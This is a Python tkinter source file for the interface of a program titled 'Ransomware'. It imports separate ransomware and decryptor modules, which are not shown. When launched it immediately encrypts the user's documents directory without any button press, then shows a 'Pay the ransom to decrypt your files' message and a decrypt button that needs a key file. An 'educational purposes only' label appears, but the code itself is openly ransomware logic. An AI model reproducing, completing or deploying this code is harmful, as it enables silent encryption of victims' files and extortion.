import tkinter as tk
from tkinter import messagebox, filedialog
from threading import Thread
import ransomware
import decryptor

class RansomwareGUI:
    def __init__(self, master):

        # Define a janela principal da interface gráfica e o título
        self.master = master  
        master.title("Ransomware") 

        #Mensagem e botões 
        self.label = tk.Label(master, text="WARNING: This program is a simulated ransomware attack for educational purposes only.")
        self.label.pack(pady=20)

        #self.encrypt_button = tk.Button(master, text="Encrypt Files", command=self.start_encryption)
        #self.encrypt_button.pack(pady=10)

        # Chama a função para encriptar os arquivos assim que a interface é iniciada
        self.start_encryption()

    def start_encryption(self):
        # Função para iniciar a criptografia dos arquivos
        Thread(target=self.encrypt_files).start()

    def encrypt_files(self):
        ransomware.encrypt_documents_directory()
        messagebox.showinfo("Encryption Complete", "Encryption completed. Pay the ransom to decrypt your files.")
        # Cria um botão para iniciar o processo de descriptografia
        self.decrypt_button = tk.Button(self.master, text="Decrypt Files", command=self.start_decryption)
        self.decrypt_button.pack(pady=10)

    def start_decryption(self):
        # Função para iniciar a descriptografia dos arquivos
        key_file_path = filedialog.askopenfilename(title="Select Key File", filetypes=[("Key Files", "*.key")])
        if key_file_path:
            Thread(target=self.decrypt_files, args=(key_file_path,)).start()

    def decrypt_files(self, key_file_path):
        decryptor.decrypt_documents_directory(key_file_path)
        messagebox.showinfo("Decryption Complete", "Decryption completed. Your files are now accessible.")

if __name__ == "__main__":
    root = tk.Tk()
    app = RansomwareGUI(root)
    root.mainloop()
